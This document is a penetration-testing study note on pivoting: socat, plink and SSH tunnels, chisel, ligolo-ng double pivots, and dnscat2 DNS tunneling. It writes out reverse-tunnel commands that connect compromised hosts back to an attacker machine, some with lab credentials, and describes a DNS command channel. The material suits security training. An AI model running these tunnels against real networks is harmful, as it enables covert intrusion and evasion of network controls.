---
title: Port Redirection And Tunneling
---
# Port Forwarding With Linux Tools
- We can use `socat` to set up port forwarding
```zsh
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```
- Other tools are `rinetd` or a combination of `netcat` and `FIFO`

# Port Forwarding With Windows Tools
## ssh.exe
- We can check if we have `ssh.exe` on Windows with `where ssh`
- If we do we can set up ssh tunneling ([[Port Redirection And Tunneling#SSH Tunneling]])
## Plink
- We can also use `plink.exe` which is Putty command line to create port forwarding
![[Pasted image 20241211214247.png]]
```powershell
C:\Windows\Temp\plink.exe -ssh -l kali -pw superpassword -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

# SSH Tunneling
## SSH Local Port Forwarding
- We can create an SSH tunnel with the use of `ssh`
- The following scenario can be achieved by the `ssh` command below
![[Pasted image 20241210182944.png]]
```zsh
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
	- The `-N` parameter will prevent a shell from being opened

- In order to create a "simple" port forward in order to access a port that is only exposed on the target localhost we can also use local port forwarding
```zsh
ssh -i alexa.priv -N -L 8080:127.0.0.1:8000 alexa@192.168.183.246 -p 2222
```
- This will forward traffic we send to our localhost on port 8080 to the localhost of our target on port 8000
## SSH Dynamic Port Forwarding
- We can dynamically forward ports by creating a SOCKS proxy server port with `ssh` and supplying the `-D` parameter
- The following scenario can be achieved by the `ssh` command below
![[Pasted image 20241211211549.png]]
```zsh
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```
- After setting up the tunnel, we need to configure the above listening port and ip to our `proxychains` configuration in `/etc/proxychains4.conf`
```zsh
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
```
- After configuring we can use `proxychains` to push traffic through the tunnel
```zsh
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```
> [!IMPORTANT]
> If we are performing a portscan through an SSH tunnel, provide `-sT`  to perform a connect scan. Run the command with `sudo`! 
> `sudo proxychains nmap -vvv -sT -p4800-4900 Pn 172.16.237.217`
> If the scan takes too long consider lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file `/etc/proxychains4.conf`


## SSH Remote Port Forwarding
- If we are not able to connect to a specific port we set up for tunneling, we can try remote port forwarding which will connect back to our attacking machine to set up the tunnel
- For this, we need to run an ssh server on our attacking machine
- The following scenario can be achieved by the `ssh` command below
![[Pasted image 20241211212807.png]]
```zsh
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

## SSH Dynamic Remote Port Forwarding
- We will again set up a SOCK listener. The syntax this time is a bit different, if we just provide a port with the `-R` argument, `ssh` will automatically assume dynamic remote port forwarding
- The following scenario can be achieve by the `ssh` command below
![[Pasted image 20241211213016.png]]
```zsh
ssh -N -R 9998 kali@192.168.118.4
```
- We again need to configure `proxychains`
```zsh
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
```
- After configuring, use `proxychain` to push traffic through the tunnel
```zsh
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

# Chisel
- We can use chisel to set up port forwarding through HTTP
- We set up a chisel server on our attack machine
```zsh
./chisel server -p 8080 --reverse
```
- To connect from our target 
```powershell
./chisel.exe client 192.168.45.232:8080 R:<localport>:<target-ip>:<target-port>
```

# Ligolo
- We can use `ligolo` to pivot. Repository is on [Nicocha30 Github](https://github.com/nicocha30/ligolo-ng)
- Ligolo uses an `agent` and `proxy` binary - running the `proxy` binary requires root privileges
- Start `ligolo` and create a new interface
```zsh
sudo ./proxy --selfcert

ligolo-ng » interface_create --name ligolo
ligolo-ng » interface_list
┌───────────────────────────────────────────────────────────┐
│ Available tuntaps                                         │
├───┬──────────┬────────────────────────────────────────────┤
│ # │ TAP NAME │ DST ROUTES                                 │
├───┼──────────┼────────────────────────────────────────────┤
│ 0 │ tun0     │ 192.168.45.0/24,192.168.245.0/24,fe80::/64 │
│ 1 │ ligolo   │                                            │
└───┴──────────┴────────────────────────────────────────────┘
```
- After we have set up the _proxy_ on our attacking machine, we can connect on our target using `agent`
```zsh
.\agent.exe -connect <Attack IP>:11601 -ignore-cert -retry
```
- We will get a notification on our `proxy` once a connection is established
- Next, we will need to set up the appropriate routes. We can use the `session` command on our proxy and select the appropriate session to interact with and run `ifconfig` to show the network configuration of the connected `agent`
```zsh
ligolo-ng » session
? Specify a session : 1 - confluence@confluence01 - 192.168.245.63:52938 - a08efa35-f0d5-4c32-bc98-c4217a16f917
[Agent : confluence@confluence01] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
│ IPv6 Address │ ::1/128             │
└──────────────┴─────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens192                         │
│ Hardware MAC │ 00:50:56:9e:b5:2e              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 192.168.245.63/24              │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens224                         │
│ Hardware MAC │ 00:50:56:9e:51:b3              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.4.245.63/24                 │
└──────────────┴────────────────────────────────┘
[Agent : confluence@confluence01] »
```
- With the above info, we can set up our route using `interface_add_route` to `10.4.245.0/24` - once added we can use `interface_list` to verify
```zsh
[Agent : confluence@confluence01] » interface_add_route --name ligolo --route 10.4.245.0/24
INFO[1278] Route created.
[Agent : confluence@confluence01] » interface_list
┌───────────────────────────────────────────────────────────┐
│ Available tuntaps                                         │
├───┬──────────┬────────────────────────────────────────────┤
│ # │ TAP NAME │ DST ROUTES                                 │
├───┼──────────┼────────────────────────────────────────────┤
│ 0 │ tun0     │ 192.168.245.0/24,fe80::/64,192.168.45.0/24 │
│ 1 │ ligolo   │ 10.4.245.0/24                              │
└───┴──────────┴────────────────────────────────────────────┘
[Agent : confluence@confluence01] »
[Agent : confluence@confluence01] » start
[Agent : confluence@confluence01] » INFO[0231] Starting tunnel to confluence@confluence01 (17554a8a-0a6e-4fd0-b9b5-d11b77ff2bc3)
```
- Once we have the route added, we start tunneling using `start` within our session. After that we are able to interact with the target network
> [!WARNING]
> Because the _agent_ is running without privileges, it's not possible to forward raw packets. When we perform a NMAP SYN-SCAN, a TCP connect() is performed on the agent. 
> When using _nmap_, we should use `--unprivileged` or `-PE` to avoid false positives.

## Ligolo Double Pivot
- To transfer the `agent` binary to our new target through our already connected _agent_ we set up an additional listener
```zsh
[Agent : confluence@confluence01] » listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:9000 --tcp
INFO[3555] Listener 0 created on remote agent!

wget http://10.4.245.63:9000/agent
```
> [!Warning]
> Apparently the ports need to match - otherwise `ligolo` seems to have trouble
- In order to pivot again we need to create a second tunnel interface on our _proxy_, set up a listener on our already connected _agent_ and then connect from our new target using the `agent` binary again
```zsh
[Agent : confluence@confluence01] » interface_create --name ligolo2
INFO[4581] Creating a new "ligolo2" interface...
INFO[4581] Interface created!

[Agent : confluence@confluence01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
INFO[4542] Listener 3 created on remote agent!

/agent -connect 10.4.245.63:11601 -ignore-cert -retry

```
> [!HINT]
> Use the `-retry` option to automaticaly recovery tunnels and listeners in case of unstalbe networ or a loss of TCP connection as per [issue](https://github.com/nicocha30/ligolo-ng/issues/101)

- After the new agent connect, interact with it again using the `session` command on our proxy and select the appropriate session to interact with and run `ifconfig` to show the network configuration of the newly connected `agent`
```zsh
[Agent : confluence@confluence01] » session
? Specify a session : 2 - database_admin@pgdatabase01 - 127.0.0.1:47980 - 95f034f0-b74d-451f-bc11-6696509f2156
[Agent : database_admin@pgdatabase01] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
│ IPv6 Address │ ::1/128             │
└──────────────┴─────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens192                         │
│ Hardware MAC │ 00:50:56:9e:15:70              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.4.245.215/24                │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens224                         │
│ Hardware MAC │ 00:50:56:9e:ea:fd              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.245.254/24              │
└──────────────┴────────────────────────────────┘
```
- With the above info, we can set up our route using `interface_add_route` to `10.16.245.0/24` on our newly created interface - once added we can use `interface_list` to verify
```zsh
[Agent : database_admin@pgdatabase01] » interface_add_route --name ligolo2 --route 10.16.245.0/24
INFO[5272] Route created.
[Agent : database_admin@pgdatabase01] » interface_list
┌───────────────────────────────────────────────────────────┐
│ Available tuntaps                                         │
├───┬──────────┬────────────────────────────────────────────┤
│ # │ TAP NAME │ DST ROUTES                                 │
├───┼──────────┼────────────────────────────────────────────┤
│ 0 │ tun0     │ 192.168.245.0/24,fe80::/64,192.168.45.0/24 │
│ 1 │ ligolo   │ 10.4.245.0/24,fe80::/64                    │
│ 2 │ ligolo2  │ 10.16.245.0/24                             │
└───┴──────────┴────────────────────────────────────────────┘
```
- After setting up the route we can again start the tunnel on our new interface - specify the interface name with `--tun`
```zsh
[Agent : database_admin@pgdatabase01] » start --tun ligolo2
[Agent : database_admin@pgdatabase01] » INFO[5368] Starting tunnel to database_admin@pgdatabase01 (95f034f0-b74d-451f-bc11-6696509f2156)
```

## Access to local ports on agent
- If we need to access the local ports of the currently connected agent, there's a "magic" CIDR hardcoded in Ligolo-ng: _240.0.0.0/4_ (This is an unused IPv4 subnet). If we query an IP address on this subnet, Ligolo-ng will automatically redirect traffic to the agent's local IP address (127.0.0.1)
```zsh
[Agent : Unknown@MULTISERVER03] » interface_route_add --name ligolo --route 240.0.0.0/4
INFO[0134] Route created.
```
# DNS Tunneling With dnscat2
- If we only have outbound port 53 open, we can try to tunnel traffic through DNS using `dnscat2`
- We need to transfer the `dnscat2` binary to our compromised host and connect tot our `dnscat2-server`
```zsh
dnscat2-server feline.corp #Set up the dnscat2-server

dnscat feline.corp #Connect to our dnscat2-server
```
- After we have an established session, we can run the `windows` command on our server and list available session. Use `window -i <sessionnumber>` to interact and use `?` to list available commands. Use `<command> --help` to show info on the individual commands
```zsh
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Half Cued Phials Libate Timer Pontic
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows
```
- We can set up port forwarding with the `listen` command
```zsh
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.150.217:445
Listening on 127.0.0.1:4455, sending connections to 172.16.150.217:445
```